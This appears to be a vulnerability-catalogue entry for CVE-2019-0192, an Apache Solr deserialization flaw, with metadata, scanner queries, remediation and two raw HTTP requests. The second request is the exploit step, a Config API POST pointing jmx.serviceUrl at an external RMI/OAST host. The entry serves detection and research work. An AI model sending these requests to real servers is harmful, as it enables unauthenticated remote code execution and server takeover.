---
layout: post
cve_id: CVE-2019-0192
title: Apache Solr - Deserialization of Untrusted Data
pcap: true
pcap_path: /pcaps/2019/CVE-2019-0192.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-0192.yaml
snort2_rule: N/A
snort3_rule: N/A
author: hnd3884
severity: critical
impact: 'Unauthenticated attackers can trigger remote code execution via unsafe deserialization
  by pointing the JMX server to a malicious RMI server, leading to complete Solr server
  compromise.

  '
remediation: 'Upgrade to Apache Solr version 5.5.6, 6.6.6, or later versions that
  are not vulnerable.

  '
reference:
- https://github.com/Imanfeng/Apache-Solr-RCE
- https://nvd.nist.gov/vuln/detail/CVE-2019-0192
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2019-0192
  cwe-id: CWE-502
  epss-score: 0.9304
  epss-percentile: 0.9977
  cpe: cpe:2.3:a:apache:solr:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: apache
  product: solr
  shodan-query: title:"Solr"
  fofa-query: title="Solr
tags:
- cve
- cve2019
- apache
- solr
- deserialization
- rce
- oast
- vkev
- vuln
---

## üîç Vulnerability Description
In Apache Solr versions 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5, the Config API allows to configure the JMX server via an HTTP POST request. By pointing it to a malicious RMI server, an attacker could take advantage of Solr's unsafe deserialization to trigger remote code execution on the Solr side.


## üåê HTTP Request
```nohighlight
GET /solr/admin/cores?wt=json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /solr/uVxEzd/config HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 115
Content-Type: application/json
Accept-Encoding: gzip

{"set-property":{"jmx.serviceUrl":"service:jmx:rmi:///jndi/rmi://d5jp53ple0o45d52011gx9a6moxr6ip59.oast.live/obj"}}
```

